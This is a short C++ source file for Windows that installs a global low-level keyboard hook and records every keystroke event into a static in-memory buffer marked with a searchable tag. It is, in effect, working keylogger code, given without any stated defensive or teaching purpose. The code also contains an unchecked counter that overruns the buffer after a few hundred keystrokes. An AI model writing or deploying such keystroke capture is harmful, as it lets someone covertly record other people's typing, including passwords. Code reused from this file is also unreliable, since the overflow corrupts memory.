#include <windows.h>
#include <iostream>

using namespace std;

struct KEYBOARDBUFFER {
	char szMarker [32];
	HKL sKeyboardLayout;
	int iCounter;
	unsigned char aucBuffer[10240];
} sKEYBOARDBUFFER;

HHOOK hookHandle;

LRESULT CALLBACK keyHandler(int nCode, WPARAM wParam, LPARAM lParam);

int main(int argc, char* argv[]) {
	strcpy(sKEYBOARDBUFFER.szMarker, "<<<KEYBOARD_BUFFER>>>");
	sKEYBOARDBUFFER.sKeyboardLayout = GetKeyboardLayout(0);

	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, keyHandler, NULL, 0);

	if(hookHandle == NULL) {
		cout << "ERROR CREATING HOOK: ";
		cout << GetLastError() << endl;
		return 0;
	}

	MSG message;

	while(GetMessage(&message, NULL, 0, 0) != 0) {
		TranslateMessage( &message );
		DispatchMessage( &message );
	}

	UnhookWindowsHookEx(hookHandle);

	return 0;
}

LRESULT CALLBACK keyHandler(int nCode, WPARAM wParam, LPARAM lParam) {
	if(nCode == HC_ACTION) {
		memcpy(&(sKEYBOARDBUFFER.aucBuffer[sKEYBOARDBUFFER.iCounter * sizeof(KBDLLHOOKSTRUCT)]), (void *)lParam, sizeof(KBDLLHOOKSTRUCT));
		sKEYBOARDBUFFER.iCounter++;
	}

	return CallNextHookEx(hookHandle, nCode, wParam, lParam);
}
